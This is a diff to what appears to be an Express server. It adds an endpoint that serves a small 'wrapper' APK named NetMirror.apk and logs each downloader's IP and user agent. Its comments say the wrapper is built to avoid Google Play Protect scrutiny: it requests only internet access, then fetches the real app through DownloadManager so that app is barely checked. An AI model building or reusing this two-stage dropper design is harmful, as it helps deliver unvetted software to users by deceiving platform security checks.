@@ -1121,6 +1121,26 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ── WRAPPER APK DOWNLOAD (landing page primary download) ─────────────────
+  // The landing page serves THIS clean wrapper (1.5 MB, INTERNET only).
+  // Chrome installs it without PP scrutiny (no suspicious permissions).
+  // The wrapper then downloads real NetMirror via DownloadManager internally
+  // (installerPackage = com.netmirror.app → LOW Play Protect scrutiny).
+  app.get('/downloadapp/setup.apk', (req, res) => {
+    try { trackEvent('wrapper_download', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
+    const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
+    if (fs.existsSync(wrapperPath)) {
+      const stats = fs.statSync(wrapperPath);
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', stats.size);
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+      res.sendFile(wrapperPath);
+    } else {
+      res.status(503).send('Setup APK not ready. Please try again shortly.');
+    }
+  });
+
   // ═══════════════════════════════════════════════════════════════════════════
   // SETUP ENDPOINTS — Called by the wrapper app (NetMirror Setup)
   //
